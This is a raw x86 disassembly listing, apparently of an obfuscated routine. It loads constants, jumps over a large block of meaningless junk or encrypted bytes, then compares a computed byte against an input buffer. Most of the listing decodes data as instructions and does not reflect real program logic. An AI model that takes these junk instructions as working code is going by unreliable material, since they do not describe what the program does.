  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [edi+esi*8-0xa]
  414159:	shl    DWORD PTR [eax+0x1a],1
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [esi+0x68],al
  414165:	in     eax,dx
  414166:	xor    BYTE PTR [edx-0x48],al
  414169:	pop    ss
  41416a:	sub    al,0xcb
  41416c:	neg    BYTE PTR [ebx]
  41416e:	xor    cl,BYTE PTR [ecx]
  414170:	je     0x4141ce
  414172:	sti    
  414173:	outs   dx,DWORD PTR ds:[esi]
  414174:	xchg   esi,eax
  414175:	sti    
  414176:	mov    dl,0x93
  414178:	mov    ecx,0xfa304f86
  41417d:	or     al,0x33
  41417f:	adc    DWORD PTR [ecx-0x28],ebp
  414182:	push   ax
  414184:	ret    0x82a3
  414187:	jno    0x4141ad
  414189:	xor    al,0x6a
  41418b:	pushf  
  41418c:	cmp    DWORD PTR [esp+ebx*1],ebp
  41418f:	outs   dx,DWORD PTR ds:[esi]
  414190:	adc    al,0xfe
  414192:	push   ebp
  414193:	shl    ebp,0x5
  414196:	sub    BYTE PTR [eax+0x2b8b121d],dl
  41419c:	inc    edi
  41419d:	xlat   BYTE PTR ds:[ebx]
  41419e:	xchg   BYTE PTR ds:0xd9eea824,bl
  4141a4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4141a6:	neg    BYTE PTR [esi+0x7d]
  4141a9:	cld    
  4141aa:	and    DWORD PTR [eax-0x8fe610d],ecx
  4141b0:	sbb    bh,al
  4141b2:	js     0x41420c
  4141b4:	pop    ebp
  4141b5:	mov    eax,ds:0x9de50a09
  4141ba:	int3   
  4141bb:	inc    edi
  4141bc:	and    eax,0x72d7d0b1
  4141c1:	or     ebp,ebp
  4141c3:	adc    al,0x24
  4141c5:	sbb    DWORD PTR [ecx-0x701685da],0xffffffdc
  4141cc:	jns    0x414181
  4141ce:	scas   al,BYTE PTR es:[edi]
  4141cf:	sbb    eax,0xd532b4d4
  4141d4:	popf   
  4141d5:	ins    BYTE PTR es:[edi],dx
  4141d6:	push   ebp
  4141d7:	std    
  4141d8:	inc    esp
  4141d9:	mov    ecx,0x9a2cf67e
  4141de:	imul   esi,DWORD PTR [edi+0x39d08586],0x6ae8d796
  4141e8:	xchg   edi,eax
  4141e9:	popf   
  4141ea:	sub    ecx,0xffffffa8
  4141ed:	and    DWORD PTR [esi-0x33ac2d12],edi
  4141f3:	inc    ecx
  4141f4:	je     0x41421c
  4141f6:	pusha  
  4141f7:	inc    ecx
  4141f8:	inc    edi
  4141f9:	lods   al,BYTE PTR ds:[esi]
  4141fa:	dec    edi
  4141fb:	cmc    
  4141fc:	ret    0x1a71
  4141ff:	cld    
  414200:	test   al,0xe7
  414202:	add    al,0x59
  414204:	mov    ch,0xbc
  414206:	inc    edx
  414207:	ja     0x414213
  414209:	push   edx
  41420a:	cmp    ch,BYTE PTR [edi-0x3b]
  41420d:	dec    edx
  41420e:	mov    WORD PTR [esi-0x7b],?
  414211:	jnp    0x4141bb
  414213:	aam    0x53
  414215:	adc    bh,BYTE PTR [ecx]
  414217:	outs   dx,DWORD PTR ds:[esi]
  414218:	mov    ah,0xd5
  41421a:	cmp    al,0x3f
  41421c:	mov    gs:0xc9663eb5,al
  414222:	sub    dl,BYTE PTR [esi]
  414224:	jle    0x41429f
  414226:	xor    cl,BYTE PTR [edi]
  414228:	mov    bl,0x22
  41422a:	lds    eax,FWORD PTR es:[edi+ebp*1-0x7e7dce73]
  414232:	jns    0x41429d
  414234:	out    0x4d,eax
  414236:	xchg   DWORD PTR [ebx+0x7e],ebx
  414239:	jo     0x414202
  41423b:	push   ebx
  41423c:	pop    edi
  41423d:	mov    ds:0x5e6fce7c,eax
  414242:	in     al,0xae
  414244:	sub    edx,DWORD PTR [ecx+0x35]
  414247:	lahf   
  414248:	rcr    BYTE PTR [edx+ebp*1],cl
  41424b:	mov    WORD PTR [eax],?
  41424d:	jb     0x4141fa
  41424f:	cmp    al,0xd4
  414251:	js     0x41425d
  414253:	pop    ecx
  414254:	cmp    esi,0xa
  414257:	shl    BYTE PTR [eax-0x4d],0xb7
  41425b:	inc    ecx
  41425c:	xchg   edx,eax
  41425d:	fcomp  st(1)
  41425f:	hlt    
  414260:	pop    ebp
  414261:	sub    bl,BYTE PTR [edi-0x6a023106]
  414267:	push   ecx
  414268:	loope  0x4142b4
  41426a:	mov    ah,0xec
  41426c:	idiv   ecx
  41426e:	mov    ebx,0xed04558d
  414273:	data16 mov ch,0x44
  414276:	cmp    al,0x9
  414278:	ss in  al,dx
  41427a:	xor    ecx,ecx
  41427c:	outs   dx,BYTE PTR ds:[esi]
  41427d:	xchg   esi,eax
  41427e:	pop    esp
  41427f:	jge    0x414279
  414281:	inc    edi
  414282:	adc    ah,BYTE PTR [eax+esi*1+0x40]
  414286:	fist   DWORD PTR [edx-0x46]
  414289:	test   BYTE PTR [ecx+ecx*4-0x54],bh
  41428d:	xchg   ecx,eax
  41428e:	popa   
  41428f:	cld    
  414290:	add    al,0x40
  414292:	or     eax,0xc97006f2
  414297:	mov    edx,0x51a60747
  41429c:	jmp    0x414277
  41429e:	jns    0x41423c
  4142a0:	ss (bad) 
  4142a4:	cmp    al,0xa9
  4142a6:	retf   
  4142a7:	or     ecx,eax
  4142a9:	xor    bh,BYTE PTR [ecx]
  4142ab:	sahf   
  4142ac:	xor    ch,ah
  4142ae:	fstp   QWORD PTR [eax]
  4142b0:	xchg   edi,eax
  4142b1:	lods   al,BYTE PTR ds:[esi]
  4142b3:	test   al,0xd5
  4142b5:	xchg   esp,eax
  4142b6:	adc    eax,0x3f705213
  4142bb:	ror    edx,0x34
  4142be:	aam    0xff
  4142c0:	lods   eax,DWORD PTR ds:[esi]
  4142c1:	enter  0xda9c,0x4b
  4142c5:	mov    al,0x9c
  4142c7:	scas   al,BYTE PTR es:[edi]
  4142c8:	out    dx,al
  4142c9:	add    DWORD PTR [esi-0x5dfff03f],esi
  4142cf:	xchg   ebx,eax
  4142d0:	mov    bh,BYTE PTR [esi+0x61]
  4142d3:	add    al,0x8f
  4142d5:	cmp    al,0x38
  4142d7:	mov    bl,0x72
  4142d9:	fwait
  4142da:	test   eax,0x8886c7d7
  4142df:	into   
  4142e0:	mov    ecx,0xb0e95308
  4142e5:	retf   0x23f7
  4142e8:	xor    BYTE PTR [esp+edi*4-0x72c36fb6],bl
  4142ef:	inc    ebp
  4142f0:	push   0x8bed21c5
  4142f5:	rol    DWORD PTR [ebx],0x57
  4142f8:	pop    ebp
  4142f9:	popa   
  4142fa:	xor    ebx,ebp
  4142fc:	xchg   DWORD PTR [eax],edi
  4142fe:	add    BYTE PTR [esi+0x792230f7],0xf3
  414305:	sbb    DWORD PTR [eax],edi
  414307:	ins    DWORD PTR es:[edi],dx
  414308:	sub    cl,BYTE PTR [ebp+0x11]
  41430b:	jmp    0x4142c5
  41430d:	popf   
  41430e:	jle    0x4142f8
  414310:	daa    
  414311:	mov    ds:0x7d089442,al
  414316:	rcl    edx,cl
  414318:	mov    cs,WORD PTR [edx]
  41431a:	dec    ebp
  41431b:	mov    ebp,0xa7a154f7
  414320:	cdq    
  414321:	and    dl,BYTE PTR [edi+0x55]
  414324:	inc    edi
  414325:	call   0x8b0e:0xa3e8c8b8
  41432c:	inc    BYTE PTR [ebp+0x79]
  41432f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414330:	in     al,0xfc
  414332:	jns    0x4142c9
  414334:	mov    esi,0x564516d2
  414339:	dec    ebx
  41433a:	cmc    
  41433b:	add    eax,0xa1c3f042
  414340:	pop    ebx
  414341:	sbb    bh,BYTE PTR [ebx+0x2d93d196]
  414347:	push   cs
  414348:	mov    cl,0x37
  41434a:	mov    esi,0x654cbe11
  41434f:	adc    ah,ch
  414351:	shl    BYTE PTR [eax],cl
  414353:	call   0x1080:0xca78a2cb
  41435a:	ret    
  41435b:	mov    esp,0xc58b1548
  414360:	ss (bad) 
  414362:	mov    edi,0xa46f9609
  414367:	sub    BYTE PTR [ebp+0x75de2e12],ah
  41436d:	leave  
  41436e:	mov    ds:0x8ea155dd,eax
  414373:	xchg   ebp,eax
  414374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414375:	adc    BYTE PTR [ebx-0x3],ch
  414378:	push   esi
  414379:	je     0x414350
  41437b:	mov    ds:0x9e79bb67,al
  414380:	mov    ebx,0x6c964757
  414385:	dec    edi
  414386:	arpl   WORD PTR [edx],dx
  414388:	leave  
  414389:	xor    bl,BYTE PTR [esi]
  41438b:	xchg   edx,eax
  41438c:	mov    ah,0x32
  41438e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41438f:	add    edx,ebx
  414391:	test   DWORD PTR [ebx],ebx
  414393:	sahf   
  414394:	sbb    al,0xcb
  414396:	pop    DWORD PTR [esi+0x7b4915be]
  41439c:	test   al,0x61
  41439e:	xor    al,ah
  4143a0:	dec    eax
  4143a1:	mov    bl,al
  4143a3:	xor    al,0x74
  4143a5:	mov    esp,0x55fd03f9
  4143aa:	sbb    edi,eax
  4143ac:	add    al,0xfc
  4143ae:	mov    fs,WORD PTR [ecx]
  4143b0:	jb     0x414420
  4143b2:	and    al,0x59
  4143b4:	cdq    
  4143b5:	(bad)  
  4143b6:	mov    cl,0x43
  4143b8:	enter  0x1417,0xf1
  4143bc:	dec    edi
  4143bd:	popf   
  4143be:	(bad)  
  4143bf:	mov    edx,0x638a0e94
  4143c4:	and    al,0xf4
  4143c6:	test   DWORD PTR [edi-0xf7481c9],esp
  4143cc:	and    ah,BYTE PTR [ebp+0x1]
  4143cf:	jne    0x4143f6
  4143d1:	clc    
  4143d2:	push   cs
  4143d3:	int3   
  4143d4:	loop   0x4143bf
  4143d6:	xchg   ebp,eax
  4143d7:	push   ss
  4143d8:	fdiv   DWORD PTR cs:[edx+0x43]
  4143dc:	cwde   
  4143dd:	rep lods eax,DWORD PTR ds:[esi]
  4143df:	xchg   DWORD PTR [ecx+0x6034bde3],ebx
  4143e5:	and    ecx,DWORD PTR [edx]
  4143e7:	xchg   ebp,eax
  4143e8:	mov    esi,ds
  4143ea:	or     eax,0xbdb619e2
  4143ef:	adc    al,0x52
  4143f1:	lahf   
  4143f2:	mov    dh,0x6d
  4143f4:	push   esi
  4143f5:	inc    edi
  4143f6:	mov    ebx,0xb49d6e9b
  4143fb:	cs dec edi
  4143fd:	push   eax
  4143fe:	dec    edi
  4143ff:	imul   esi,DWORD PTR [edx+0x54],0x75
  414403:	or     BYTE PTR [edi+ebx*4],0x72
  414407:	pop    ss
  414408:	inc    ecx
  414409:	mov    esp,0x4e382e11
  41440e:	jnp    0x414479
  414410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414411:	push   cs
  414412:	pusha  
  414413:	in     al,0xf0
  414415:	arpl   sp,bp
  414417:	scas   eax,DWORD PTR es:[edi]
  414418:	sbb    eax,0xa4bf88c6
  41441d:	repz inc eax
  41441f:	imul   ebx,esp,0x0
  414422:	ss js  0x41446c
  414425:	lock (bad) 
  414427:	mov    edx,0x2c6162d6
  41442c:	(bad)  
  41442e:	ss push ebp
  414430:	jbe    0x41440a
  414432:	jbe    0x414422
  414434:	dec    ebp
  414435:	sbb    BYTE PTR [esi+eax*1+0x4e],ah
  414439:	loop   0x41448d
  41443b:	and    dl,BYTE PTR [edx+edx*2+0x25]
  41443f:	add    ebp,DWORD PTR [ebp-0x22b5cdcc]
  414445:	gs int3 
  414447:	xchg   edi,eax
  414448:	mov    edi,DWORD PTR [ebp-0x25]
  41444b:	jl     0x4143ea
  41444d:	cmp    ebp,esi
  41444f:	jp     0x41440a
  414451:	dec    esi
  414452:	cmp    al,0x10
  414454:	add    al,0x61
  414456:	ret    
  414457:	push   esp
  414458:	pop    ebp
  414459:	test   al,0xb7
  41445b:	rcl    BYTE PTR ds:0x6d95c08a,1
  414461:	adc    ebp,DWORD PTR [eax]
  414463:	mov    BYTE PTR [edx+ecx*1-0xb],ah
  414467:	rcr    BYTE PTR [edi+0x2d99c129],cl
  41446d:	fstp   QWORD PTR [esi-0x50]
  414470:	imul   ebp,esp
  414473:	inc    edi
  414474:	push   esi
  414475:	(bad)  
  414476:	cmp    BYTE PTR [edx],dl
  414478:	sbb    BYTE PTR [edx+0x1393de4],cl
  41447e:	xchg   bh,bh
  414480:	dec    edi
  414481:	push   0x23495097
  414486:	je     0x414448
  414488:	cmp    DWORD PTR [edi-0x2e6e2104],ebx
  41448e:	adc    BYTE PTR [eax+0x57eee59f],dl
  414494:	icebp  
  414495:	cmp    BYTE PTR [ebx-0x2bdcec07],bl
  41449b:	jl     0x414445
  41449d:	lea    eax,[edi]
  41449f:	enter  0x1408,0x5
  4144a3:	(bad)
  4144a6:	cmp    eax,0x4f6dd98e
  4144ab:	test   al,0x6f
  4144ad:	test   DWORD PTR [ebp-0x48de77ca],eax
  4144b3:	popf   
  4144b4:	ins    BYTE PTR es:[edi],dx
  4144b5:	mov    edx,0xac9d7b5
  4144ba:	sar    eax,1
  4144bc:	fdiv   st(4),st
  4144be:	aas    
  4144bf:	xor    al,0x1a
  4144c1:	(bad)  
  4144c3:	sub    eax,0xc559f641
  4144c8:	in     al,0x6e
  4144ca:	cmp    DWORD PTR [esi+0x5771b7cb],0xffffffe9
  4144d1:	xchg   ecx,eax
  4144d2:	dec    ebx
  4144d3:	pusha  
  4144d4:	sub    eax,0xea7743ac
  4144d9:	pop    ss
  4144da:	mov    ecx,DWORD PTR [edi]
  4144dc:	xchg   ecx,eax
  4144dd:	out    0x6e,eax
  4144df:	sbb    edi,ebp
  4144e1:	sbb    eax,0x508903f6
  4144e6:	xlat   BYTE PTR ds:[ebx]
  4144e7:	(bad)  
  4144e8:	sub    eax,0xe3ad42bc
  4144ed:	arpl   bx,ax
  4144ef:	pop    ebx
  4144f0:	mov    esp,0xa4a53eed
  4144f5:	push   edi
  4144f6:	jae    0x4144db
  4144f8:	popf   
  4144f9:	rol    DWORD PTR [eax-0x7e],1
  4144fc:	iret   
  4144fd:	push   esp
  4144fe:	sbb    DWORD PTR [edx+0x16917a27],edx
  414504:	aam    0xfa
  414506:	or     DWORD PTR [ebx-0x3891a161],0x45
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x357c:0x73623c4c
  414595:	push   edi
  414596:	and    DWORD PTR [esi-0x2e],edi
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [edi-0x1d],cl
  4145a2:	sub    dh,bh
  4145a4:	test   DWORD PTR [ecx-0x54],edx
  4145a7:	mov    edx,0xa368b944
  4145ac:	sbb    bl,BYTE PTR [ecx+eax*4-0x614f089]
  4145b3:	add    DWORD PTR [eax],edx
  4145b5:	push   es
  4145b6:	int    0xc4
  4145b8:	loopne 0x414564
  4145ba:	or     eax,0xd440ec4
  4145bf:	and    eax,0x76f552b8
  4145c4:	jne    0x4145d1
  4145c6:	out    dx,al
  4145c7:	pop    ss
  4145c8:	js     0x4145eb
  4145ca:	mov    edi,0x1eac1b0
  4145cf:	into   
  4145d0:	push   ds
  4145d1:	ret    
  4145d2:	cmc    
  4145d3:	neg    ah
  4145d5:	(bad)  
  4145d6:	out    0x5e,eax
  4145d8:	inc    ecx
  4145d9:	pusha  
  4145da:	cwde   
  4145db:	in     eax,dx
  4145dc:	jns    0x4145c4
  4145de:	rcr    DWORD PTR [edx],1
  4145e0:	test   eax,0xf959614d
  4145e5:	dec    eax
  4145e6:	cmp    BYTE PTR [eax],bl
  4145e8:	and    eax,0x1ffbff10
  4145ed:	or     esp,DWORD PTR [ecx-0x739c39b9]
  4145f3:	pop    eax
  4145f4:	loop   0x41463a
  4145f6:	xlat   BYTE PTR ds:[ebx]
  4145f7:	cmp    BYTE PTR [esi],ch
  4145f9:	mov    DWORD PTR [ecx+0x3a],ecx
  4145fc:	cdq    
  4145fd:	jmp    0x8f2e0796
  414602:	xchg   BYTE PTR [ebp-0x3820f0e7],bl
  414608:	lods   eax,DWORD PTR ds:[esi]
  414609:	add    BYTE PTR [edx],ah
  41460b:	in     al,0x43
  41460d:	(bad)  
  41460e:	xchg   ebx,eax
  41460f:	adc    eax,esi
  414611:	pop    es
  414612:	test   DWORD PTR [eax+0x1b],eax
  414615:	push   ss
  414616:	jmp    0xd56e:0xe3759e93
  41461d:	jge    0x414630
  41461f:	leave  
  414620:	stc    
  414621:	mov    ds:0x36d7d6f2,eax
  414626:	xor    eax,0xf1231827
  41462b:	mov    al,0xf5
  41462d:	ror    BYTE PTR [ebx+0x1d34c796],0xd4
  414634:	inc    ecx
  414635:	ins    BYTE PTR es:[edi],dx
  414636:	aam    0x64
  414638:	or     eax,0x387df9f1
  41463d:	jne    0x414658
  41463f:	ja     0x4145ff
  414641:	dec    eax
  414642:	js     0x41460a
  414644:	jo     0x41465d
  414646:	mov    eax,0xd780575e
  41464b:	aad    0xeb
  41464d:	mov    dh,BYTE PTR [ecx]
  41464f:	ret    0xf66
  414652:	std    
  414653:	call   0xc30faf0f
  414658:	xor    ah,bl
  41465a:	out    0xcd,eax
  41465c:	jmp    0xcb4c8b4d
  414661:	arpl   bx,bp
  414663:	cmp    DWORD PTR [ebx-0xc],edx
  414666:	cmp    cl,ah
  414668:	cs push ebp
  41466a:	fadd   st,st(3)
  41466c:	out    0x5,eax
  41466e:	dec    ecx
  41466f:	(bad)  
  414670:	dec    edx
  414671:	retf   
  414672:	dec    ebp
  414673:	xchg   ebp,eax
  414674:	push   edi
  414675:	fistp  DWORD PTR [eax+0x55]
  414678:	xchg   ebx,eax
  414679:	(bad)  
  41467a:	in     al,0x23
  41467c:	pop    ecx
  41467d:	pushf  
  41467e:	or     DWORD PTR [eax*8+0x5fb37bc5],ebx
  414685:	aam    0x61
  414687:	mov    dl,0xd6
  41468a:	data16 repz or bh,BYTE PTR [eax+edx*2-0x15]
  414690:	pop    edi
  414691:	popf   
  414692:	push   ebx
  414693:	sbb    al,0xc8
  414695:	pop    es
  414696:	mov    ch,dh
  414698:	cld    
  414699:	repnz pop ecx
  41469b:	pusha  
  41469c:	cmp    al,BYTE PTR [ebp+0x6f]
  41469f:	aam    0xde
  4146a1:	fcomip st,st(0)
  4146a3:	add    bh,ch
  4146a5:	jmp    0x3f690647
  4146aa:	pop    esp
  4146ab:	(bad)
  4146af:	mov    al,0x4
  4146b1:	and    al,0x50
  4146b3:	arpl   dx,dx
  4146b5:	pop    eax
  4146b6:	shl    BYTE PTR [ecx-0x65],0x62
  4146ba:	jecxz  0x41469c
  4146bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146bd:	and    BYTE PTR [esi],dl
  4146bf:	adc    al,0xf8
  4146c1:	sbb    eax,0x17086939
  4146c6:	das    
  4146c7:	xchg   edi,eax
  4146c8:	push   ebp
  4146c9:	rol    BYTE PTR [edi+0x5e62cd6a],0xbb
  4146d0:	push   eax
  4146d1:	imul   esi,DWORD PTR [ebx],0x6c2e99dc
  4146d7:	adc    dh,cl
  4146d9:	push   eax
  4146da:	mov    ds:0xb2e6078c,eax
  4146df:	dec    edx
  4146e0:	shr    BYTE PTR [esi],1
  4146e2:	dec    edx
  4146e3:	cs jo  0x414697
  4146e6:	pop    edx
  4146e7:	hlt    
  4146e8:	in     al,dx
  4146e9:	jns    0x414686
  4146eb:	jbe    0x414677
  4146ed:	ret    0x71b8
  4146f0:	outs   dx,DWORD PTR ds:[esi]
  4146f1:	jge    0x41471a
  4146f3:	in     eax,0xdb
  4146f5:	add    DWORD PTR [edi],ebp
  4146f7:	mov    BYTE PTR ds:0x8d7db65d,0x36
  4146fe:	adc    eax,esp
  414700:	nop
  414701:	pcmpgtb mm3,mm0
  414704:	test   eax,0x6b65eec6
  414709:	test   al,0xd8
  41470b:	les    esi,FWORD PTR [edi-0xd]
  41470e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41470f:	sub    BYTE PTR [ebx+0x37142cb7],dl
  414715:	mov    WORD PTR ds:0x3cfacde8,cs
  41471b:	mov    cs,WORD PTR [ebx]
  41471d:	iret   
  41471e:	out    dx,eax
  41471f:	push   ebx
  414720:	(bad)  
  414721:	pop    esp
  414722:	mov    WORD PTR [ebx+0x31c40e6d],gs
  414728:	cmp    ch,BYTE PTR [edi]
  41472a:	mov    WORD PTR ds:0x5b8cf933,?
  414730:	jo     0x4146c6
  414732:	or     dl,ah
  414734:	sar    BYTE PTR [ecx+ebx*1],0x1
  414738:	das    
  414739:	xchg   esp,eax
  41473a:	and    DWORD PTR [ecx+ecx*2+0x49b87204],ecx
  414741:	fisub  DWORD PTR [esi+0x216c9d2b]
  414747:	pop    eax
  414748:	addr16 repz jmp 0x6c05:0xcd314817
  414751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414752:	pop    es
  414753:	mov    ah,0xf6
  414755:	mov    eax,ds:0x4dc3077a
  41475a:	mov    eax,0x1c835600
  41475f:	imul   ebp,DWORD PTR [esi],0xffffffc1
  414762:	fisubr WORD PTR [eax+0x1ce25d10]
  414768:	mov    ds:0x6bed0b1f,eax
  41476d:	adc    BYTE PTR [esi+0xc3ff956],dh
  414773:	push   ds
  414774:	idiv   ebp
  414776:	call   0xf000:0x458c899a
  41477d:	(bad)  
  41477e:	mov    edi,0x7a6c675c
  414783:	pop    ebx
  414784:	mov    ?,WORD PTR [edx-0x7e3dfa8f]
  41478a:	int3   
  41478b:	std    
  41478c:	mov    ?,WORD PTR [edx-0x3a59c674]
  414792:	xor    DWORD PTR [ecx],ebx
  414794:	adc    ch,BYTE PTR [ebp+0x47]
  414797:	mov    ds:0x6cec480c,eax
  41479c:	loope  0x4147eb
  41479e:	pop    DWORD PTR [edi+0x105e9ea6]
  4147a4:	dec    ecx
  4147a5:	in     eax,dx
  4147a6:	mov    ds:0x620bfd56,al
  4147ab:	pusha  
  4147ac:	(bad)  
  4147ad:	addr16 jmp 0x73e4:0xe015ef5c
  4147b5:	data16 fcomp DWORD PTR [ebx+0x79a875db]
  4147bc:	es out 0xb0,al
  4147bf:	cmp    ch,BYTE PTR [esi+0x4435f5cf]
  4147c5:	inc    edx
  4147c6:	loopne 0x41477f
  4147c8:	jbe    0x414802
  4147ca:	xor    al,0xb2
  4147cc:	aam    0x27
  4147ce:	push   edx
  4147cf:	or     al,0xe9
  4147d1:	xlat   BYTE PTR ds:[ebx]
  4147d2:	cdq    
  4147d3:	lods   al,BYTE PTR ds:[esi]
  4147d4:	and    BYTE PTR [edx-0x1d86d0bf],dl
  4147da:	jno    0x4147df
  4147dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147dd:	fst    st(4)
  4147df:	dec    eax
  4147e0:	stos   BYTE PTR es:[edi],al
  4147e1:	and    DWORD PTR [edi-0x7b8676a0],ecx
  4147e7:	push   0xffffffa3
  4147e9:	push   ds
  4147ea:	pop    ss
  4147eb:	mov    eax,ds:0xf93b5ba9
  4147f0:	sub    esi,edi
  4147f2:	ja     0x41481d
  4147f4:	jb     0x4147c2
  4147f6:	xchg   edx,eax
  4147f7:	adc    DWORD PTR [edi-0x3b40f0a8],esi
  4147fd:	jns    0x41487e
  4147ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414800:	les    esi,FWORD PTR [edx]
  414802:	out    dx,eax
  414803:	call   0x715e:0xacb34058
  41480a:	leave  
  41480b:	rcl    DWORD PTR [ebx+0x6],cl
  41480e:	iret   
  41480f:	cld    
  414810:	fst    QWORD PTR [ebp+0xc]
  414813:	sbb    DWORD PTR [edi-0x5fdf8555],ecx
  414819:	sub    dh,0x8c
  41481c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481d:	push   ebp
  41481e:	cmp    edi,ebp
  414820:	mov    edi,0x70b48b8b
  414825:	mov    edi,0xaeb0ef30
  41482a:	outs   dx,DWORD PTR ds:[esi]
  41482b:	dec    esp
  41482c:	inc    edx
  41482d:	jne    0x414899
  41482f:	and    esp,ebp
  414831:	xor    dl,BYTE PTR [esi+0x5]
  414834:	dec    ecx
  414835:	add    ch,0x89
  414838:	lock or BYTE PTR [edi],bl
  41483b:	ret    
  41483c:	mul    DWORD PTR [eax+0x592e472c]
  414842:	aaa    
  414843:	arpl   WORD PTR [edi+0x1c],ax
  414846:	push   cs
  414847:	fsubr  st,st(6)
  414849:	leave  
  41484a:	mov    ebp,0x4c5f330
  41484f:	jbe    0x41486c
  414851:	fprem1 
  414853:	xor    al,0x3
  414855:	adc    al,0x9b
  414857:	fs mov bh,0xe1
  41485a:	popa   
  41485b:	stos   DWORD PTR es:[edi],eax
  41485c:	iret   
  41485d:	stos   BYTE PTR es:[edi],al
  41485e:	and    DWORD PTR [esi-0x4e],0xb60ae78f
  414865:	mov    ch,0x68
  414867:	nop
  414868:	mov    esp,0xb7b90472
  41486d:	fild   QWORD PTR [eax-0x52755ddb]
  414873:	xchg   DWORD PTR [esi+0x13d52a5f],eax
  414879:	cmp    BYTE PTR [ecx],ah
  41487b:	popa   
  41487c:	mov    al,0xd8
  41487e:	imul   esi,esi,0x9e4c77d
  414884:	push   0xfffffff1
  414886:	scas   eax,DWORD PTR es:[edi]
  414887:	(bad)  
  414888:	and    al,0x9b
  41488a:	pop    ds
  41488b:	mov    DWORD PTR [ecx],0xe59f37dd
  414891:	push   edi
  414892:	mov    edi,0x2eac4ba2
  414897:	cwde   
  414898:	push   edx
  414899:	sub    eax,0x4b99e135
  41489e:	push   edi
  41489f:	ficomp WORD PTR [ebx+0x68]
  4148a2:	lods   al,BYTE PTR ds:[esi]
  4148a3:	aas    
  4148a4:	stc    
  4148a5:	into   
  4148a6:	call   0x4bc6f600
  4148ab:	enter  0xe7b5,0x19
  4148af:	mov    esp,0x341cb74c
  4148b4:	mov    ebx,DWORD PTR [edx+0x41]
  4148b7:	loop   0x4148f9
  4148b9:	xchg   BYTE PTR [esi+0x176f897f],dh
  4148bf:	add    dh,BYTE PTR [edx-0x6046dd78]
  4148c5:	popa   
  4148c6:	adc    ebx,DWORD PTR [ecx+0x71aa94fa]
  4148cc:	mov    dh,0x29
  4148ce:	ret    0xc8de
  4148d1:	and    eax,0x6015335e
  4148d6:	push   esp
  4148d7:	xchg   edi,eax
  4148d8:	rcl    DWORD PTR [esi+0x4730ce81],0xea
  4148df:	xchg   edi,eax
  4148e0:	dec    esi
  4148e1:	(bad)  
  4148e2:	jne    0x414944
  4148e4:	mov    ecx,0x16fb451b
  4148e9:	cld    
  4148ea:	pop    esp
  4148eb:	ins    DWORD PTR es:[edi],dx
  4148ec:	xor    eax,0x28c912aa
  4148f1:	push   0xffffffdb
  4148f3:	push   0x9e12869e
  4148f8:	repnz xlat BYTE PTR ds:[ebx]
  4148fa:	jle    0x41488e
  4148fc:	jecxz  0x414934
  4148fe:	add    ah,al
  414900:	dec    ebp
  414901:	xor    DWORD PTR [esi-0x54],0x13128db8
  414908:	sub    DWORD PTR [ebx-0x3],ebp
  41490b:	jae    0x414958
  41490d:	inc    edx
  41490e:	or     edi,edi
  414910:	retf   0xb609
  414913:	outs   dx,BYTE PTR ds:[si]
  414915:	leave  
  414916:	(bad)  
  414917:	pop    ss
  414918:	add    eax,esi
  41491a:	jecxz  0x4148f7
  41491c:	lods   eax,DWORD PTR ds:[esi]
  41491d:	test   eax,0x9b59555d
  414922:	lods   al,BYTE PTR ds:[esi]
  414923:	mov    al,ds:0x1e7e7e97
  414928:	adc    BYTE PTR [edi],cl
